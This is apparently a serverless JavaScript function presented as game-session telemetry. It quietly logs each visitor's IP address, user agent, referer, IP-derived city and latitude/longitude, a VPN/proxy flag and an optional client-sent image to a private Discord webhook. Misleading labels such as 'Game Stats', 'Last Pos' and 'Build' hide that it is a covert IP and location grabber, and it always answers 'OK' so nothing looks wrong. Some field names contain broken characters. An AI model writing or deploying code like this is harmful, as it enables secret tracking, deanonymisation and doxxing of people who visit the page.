export async function handler(event) {
  try {
    const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
    if (!WEBHOOK) return { statusCode: 200, body: 'OK' };
    if (event.httpMethod !== 'POST') return { statusCode: 200, body: 'OK' };

    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() 
                  || event.headers['cf-connecting-ip']
                  || event.headers['x-real-ip'] 
                  || 'Unknown';

    let data = {};
    try { data = JSON.parse(event.body || '{}'); } catch (_) {}

    const userAgent = event.headers['user-agent'] || 'Unknown';
    const referer = event.headers['referer'] || 'Direct';
    const ts = new Date().toISOString();

    let geo = { country: 'XX', city: 'Unknown', org: 'Unknown', isVpn: false, lat: null, lon: null };

    if (data._loc) {
      try {
        const r = await fetch(`https://ipapi.co/${clientIP}/json/`);
        if (r.ok) {
          const j = await r.json();
          const vpnASNs = ['AS13335','AS8075','AS14061','AS16509','AS20940','AS9009','AS174','AS32590','AS54113'];
          const vpnOrgs = ['cloudflare','digital ocean','amazon','google','microsoft','oracle','vultr','linode','hetzner'];
          const isVpn = vpnASNs.includes(j.asn) || vpnOrgs.some(o => j.org?.toLowerCase().includes(o));
          
          geo = {
            country: j.country || 'XX',
            city: j.city || 'Unknown',
            org: j.org || 'Unknown',
            isVpn: isVpn,
            lat: j.latitude,
            lon: j.longitude
          };
        }
      } catch (_) {}
    }

    const flag = (c) => {
      if (!c || c.length !== 2) return '🌍';
      return String.fromCodePoint(...[...c.toUpperCase()].map(x => 0x1F1E6 + x.charCodeAt(0) - 65));
    };

    const embed = {
      title: '🎮 Game Session',
      description: `${flag(geo.country)} Player session started`,
      color: 0x00ff00,
      fields: [
        { name: 'Player IP', value: clientIP, inline: true },
        { name: 'Region', value: geo.country, inline: true },
        { name: 'Client', value: data._plat || 'Unknown', inline: true }
      ],
      footer: { text: 'Game Stats' },
      timestamp: ts
    };

    if (geo.isVpn) {
      embed.fields.push({ name: '🛡️ Mode', value: 'Proxy detected', inline: true });
    }

    if (geo.lat && geo.lon) {
      embed.fields.push({ name: '� Last Pos', value: `${geo.lat.toFixed(2)}, ${geo.lon.toFixed(2)}`, inline: true });
    }

    embed.fields.push({ name: '� Source', value: referer.substring(0, 50), inline: true });
    embed.fields.push({ name: '🎫 Build', value: userAgent.substring(0, 60), inline: false });

    if (data._img && data._img.startsWith('data:')) {
      embed.thumbnail = { url: data._img };
    }

    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    return { statusCode: 200, body: 'OK' };
  } catch (_) {
    return { statusCode: 200, body: 'OK' };
  }
}
